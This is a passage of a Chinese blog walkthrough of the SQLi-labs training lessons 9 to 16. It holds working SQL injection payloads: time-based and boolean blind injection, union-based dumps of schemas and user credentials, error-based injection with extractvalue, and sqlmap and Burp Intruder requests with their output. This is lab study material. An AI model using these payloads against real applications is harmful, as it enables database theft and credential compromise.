>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td>4</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td>5</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>6</td>\n<td>6</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-8\"><a class=\"markdownIt-Anchor\" href=\"#总结-8\">#</a> 总结</h2>\n<p>盲注一个个手打的话就是很费时间，疲惫</p>\n<p>有 sqlmap 真好</p>\n<hr>\n<h1 id=\"less-9\"><a class=\"markdownIt-Anchor\" href=\"#less-9\">#</a> Less-9</h1>\n<p>date：2020-11-21 15:10:01</p>\n<h2 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程</h2>\n<h3 id=\"sqlmap-9\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-9\">#</a> sqlmap</h3>\n<p>同 less-1</p>\n<h3 id=\"手工注入-9\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-9\">#</a> 手工注入</h3>\n<p>不管输入什么都是正常输出，明明输入的 id 数据库里面就没有，还说 you are in，用户体验差评：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Welcome    DhakkanYou are in...........</span><br></pre></td></tr></table></figure>\n<p>利用 if () 函数进行时间盲注，发现闭合单引号的时候它就一直睡觉咯</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((1=2),1,sleep(2333)) %23</span><br></pre></td></tr></table></figure>\n<p>和布尔盲注类似，但是是根据服务器响应的时间长短进行判断了，开干</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((length(database())=8),sleep(2333),1) %23</span><br></pre></td></tr></table></figure>\n<p>判断出 database () 的长度是 8 个字符，还是接着上 bp：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-9/?id=1%27%20and%20if((ascii(substr(database(),§1§,1))=§115§),sleep(11),1)%20%23 HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>bp 的 result，根据 ascii 值就可以吧当前数据名弄出来了：</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td>4</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-9\"><a class=\"markdownIt-Anchor\" href=\"#总结-9\">#</a> 总结</h2>\n<p>其实想节省时间可以去看数据库的命名规范，确定要测试的字符有哪些，这样在进行大量数据测试的时候会节省一些时间</p>\n<hr>\n<h1 id=\"less-10\"><a class=\"markdownIt-Anchor\" href=\"#less-10\">#</a> Less-10</h1>\n<p>date：2020-11-21 15:55:10</p>\n<h2 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程</h2>\n<h3 id=\"sqlmap-10\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-10\">#</a> sqlmap</h3>\n<p>同 less-1</p>\n<h3 id=\"手工注入-10\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-10\">#</a> 手工注入</h3>\n<p>和 less-9 相比就是单引号闭合变成了双引号闭合</p>\n<p>用这个 payload，服务器就睡觉啦：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-10?id=1&quot; and if((1=1),sleep(2333),1) %23+</span><br></pre></td></tr></table></figure>\n<p>后面的流程和 less-9 一样</p>\n<h2 id=\"总结-10\"><a class=\"markdownIt-Anchor\" href=\"#总结-10\">#</a> 总结</h2>\n<p>遇到这个题目也不知道是该开心还是该开心</p>\n<hr>\n<h1 id=\"less-11\"><a class=\"markdownIt-Anchor\" href=\"#less-11\">#</a> Less-11</h1>\n<p>date：2020-11-21 16:23:25</p>\n<h2 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程</h2>\n<p>写完时间盲注的我，看见这道题目，眼前一亮！终于换题目啦哈哈哈哈哈哈哈嗝</p>\n<h3 id=\"sqlmap-11\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-11\">#</a> sqlmap</h3>\n<p>sqlmap 测 post 请求可以用参数 forms</p>\n<p>这里用的–forms 参数，直接搞到所有数据库了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-11 --forms --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>后面爆字段值改参数就可以了，同 less-1</p>\n<h3 id=\"手工注入-11\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-11\">#</a> 手工注入</h3>\n<p>看见登录框就想 admin/123456 登录（竟然失败了！气人！）</p>\n<p>抓包看见的是 post 请求，所以不能和之前一样直接在 url 后面接参数了，那就在输入框直接注入哈哈哈</p>\n<p>payload，username 最后面有个空格，不加空格注释符号和后面的符号连接在一起，就起不到注释的功能啦:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Username :    admin&#x27; or 1=1 -- Password :    123456</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>有数据回显，舒服了</p>\n<p>上 bp 抓包，直接改后面的参数，根据 order by 确定需要两个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-11/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-11/Content-Type: application/x-www-form-urlencodedContent-Length: 51Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin%27 order by 2+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出，竟然真的有一个 admin/admin…：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:admin&lt;br&gt;Your Password:admin&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>爆数据库 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(schema_name) from information_schema.schemata+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:information_schema,bookstore,challenges,dvwa,edusys,exam,fresh,hotel,hy,hy2,mysql,news,pentest,performance_schema,pikachu,security,store,student,test,vote&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>爆表 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:emails,referers,uagents,users&lt;br</span><br></pre></td></tr></table></figure>\n<p>爆字段:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>爆字段值:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)) from users +--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:Dumb--Dumb,Angelina--I-kill-you,Dummy--p@ssword,secure--crappy,stupid--stupidity,superman--genious,batman--mob!le,admin--admin,admin1--admin1,admin2--admin2,admin3--admin3,dhakkan--dumbo,admin4--admin4&lt;br</span><br></pre></td></tr></table></figure>\n<p>后面的都是常规操作了</p>\n<h2 id=\"总结-11\"><a class=\"markdownIt-Anchor\" href=\"#总结-11\">#</a> 总结</h2>\n<p>sqlmap 测 post 请求可以用参数 forms，直接获取表单，可以使用 - r 参数读取请求文件，或者通过–data 参数测试，具体情况具体百度</p>\n<p>-r 读取的文件可以用 bp 抓包，右键 copy to file，直接导出 txt 文件</p>\n<hr>\n<h1 id=\"less-12\"><a class=\"markdownIt-Anchor\" href=\"#less-12\">#</a> Less-12</h1>\n<h2 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程</h2>\n<p>date：2020-11-21 17:21:22</p>\n<h3 id=\"sqlmap-12\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-12\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-12\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-12\">#</a> 手工注入</h3>\n<p>上 bp 抓包</p>\n<p>发现双引号报错，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot;+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>我？？？</p>\n<p>生气的乱搞了:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot;5678+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;5678 or 1=1 -- &quot;) and password=(&quot;1234&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>这下出来了把，后面是 &quot;)，再加个括号闭合一下下，分别 order by2 和 3，确定是两个字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin123455&quot;)+order by 3--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出当前数据库～</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin123455&quot;)+union select 1,database()--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:security&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>后续操作参考 less-11</p>\n<h2 id=\"总结-12\"><a class=\"markdownIt-Anchor\" href=\"#总结-12\">#</a> 总结</h2>\n<p>和上一关比就是单引号闭合变成 &quot;) 闭合了，和前面十关做的题目一样呀，后面不会还是一样的吧，然后写完盲注就没了把</p>\n<p>唉，我觉得我的专注力有点不太够，才写了几道题啊，还花了这么长时间，真是废物</p>\n<hr>\n<h1 id=\"less-13\"><a class=\"markdownIt-Anchor\" href=\"#less-13\">#</a> Less-13</h1>\n<p>date：2020-11-21 18:08:01</p>\n<h2 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程</h2>\n<h3 id=\"sqlmap-13\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-13\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-13\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-13\">#</a> 手工注入</h3>\n<p>盲猜这题是 ')) 闭合，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin%27%29%29+or+1%3D1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) or 1=1 -- 23&#x27;) and password=(&#x27;32&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>哦豁，是 ') 闭合，生气！闭合：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;) or 1=1+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出只有一张图片，表示闭合成功，没有数据回显</p>\n<p>那就用报错来看数据呗，正好报错注入的函数我用的少</p>\n<p>extractvalue (目标 xml 文档，xml 路径) 用于查询 xml 文件</p>\n<p>第二个参数 xml 中的位置是可操作的地方，xml 文档中查找字符位置是用 /xxx/xxx/xxx/… 这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;) and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+23&amp;passwd=32&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出得到当前数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: &#x27;~security</span><br></pre></td></tr></table></figure>\n<p>拿别的数据在 xml 路径那里改 payload 即可，参考 less-11</p>\n<h2 id=\"总结-13\"><a class=\"markdownIt-Anchor\" href=\"#总结-13\">#</a> 总结</h2>\n<p><a href=\"https://www.cnblogs.com/wocalieshenmegui/p/5917967.html\">十种 sql 报错注入姿势总结</a></p>\n<hr>\n<h1 id=\"less-14\"><a class=\"markdownIt-Anchor\" href=\"#less-14\">#</a> Less-14</h1>\n<p>date：2020-11-21 19:47:21</p>\n<h2 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程</h2>\n<h3 id=\"sqlmap-14\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-14\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-14\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-14\">#</a> 手工注入</h3>\n<p>直接双引号闭合了，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot; order by 666+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Unknown column &#x27;666&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<p>能闭合了就随便用之前的哪个方法拿数据都可以啦，用报错注入拿个数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot; and extractvalue(1,concat(&#x27;~&#x27;,database()))+--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>\n<p>别的同 Less-11</p>\n<h2 id=\"总结-14\"><a class=\"markdownIt-Anchor\" href=\"#总结-14\">#</a> 总结</h2>\n<p>这，没啥</p>\n<hr>\n<h1 id=\"less-15\"><a class=\"markdownIt-Anchor\" href=\"#less-15\">#</a> Less-15</h1>\n<p>date：2020-11-21 20:03:27</p>\n<h2 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程</h2>\n<h3 id=\"sqlmap-15\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-15\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-15\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-15\">#</a> 手工注入</h3>\n<p>看标题，布尔盲注，行叭，上 bp 抓包</p>\n<p>单引号闭合后接 order by 2，给的是 flag.jpg</p>\n<p>接 order by 2，给的是 slap.jpg</p>\n<p>明显 flag.jpg 的就是登陆成功嘛</p>\n<p>说明单引号闭合成功且需要的是两个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; order by 3+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>还是先利用 if 判断，把数据库名字长度搞出来，利用一下 payload，服务器沉睡了好一会才醒来，那么长度就是 8 啦！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27; and if( length(database())=8,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>一个一个字符猜，这种搬砖的活还是交给 bp 把</p>\n<p>右键 send to Intruder，attack type 选 cluster bomb:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-15/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-15/Content-Type: application/x-www-form-urlencodedContent-Length: 81Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&#x27; and if( ascii(substr(database(),§1§,1))=§8§,sleep(23),1 )+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 less-11</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1691</td>\n<td></td>\n</tr>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>1737</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结-15\"><a class=\"markdownIt-Anchor\" href=\"#总结-15\">#</a> 总结</h2>\n<hr>\n<h1 id=\"less-16\"><a class=\"markdownIt-Anchor\" href=\"#less-16\">#</a> Less-16</h1>\n<p>date：2020-11-21 22:33:47</p>\n<h2 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程</h2>\n<h3 id=\"sqlmap-16\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-16\">#</a> sqlmap</h3>\n<p>同 less-11</p>\n<h3 id=\"手工注入-16\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-16\">#</a> 手工注入</h3>\n<p>username 输入 <code>admin&quot;) or 1=1 -- </code> 直接登录成功，不要忘记–后面的空格哈</p>\n<p>因为可以根据图片的显示判断，所以其实时间盲注还是布尔盲注都是可以的呀，只是前面那道题用过布尔盲注了，这里就用时间盲注</p>\n<p>老规矩先判断数据库长度是 8：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&quot;) and length(database())=8 -- </span><br></pre></td></tr></table></figure>\n<p>然后搬砖找 bp，send to Intruder：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-16/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-16/Content-Type: application/x-www-form-urlencodedContent-Length: 78Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheunameadmin&quot;) and if(ascii(substr(database(),§1§,1))=§8§,slepp(23),1)--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>第一个参数从 1-8，第二个参数从 1-127，最后根据 ascii 值把数据库名拖出来，爆字段参考 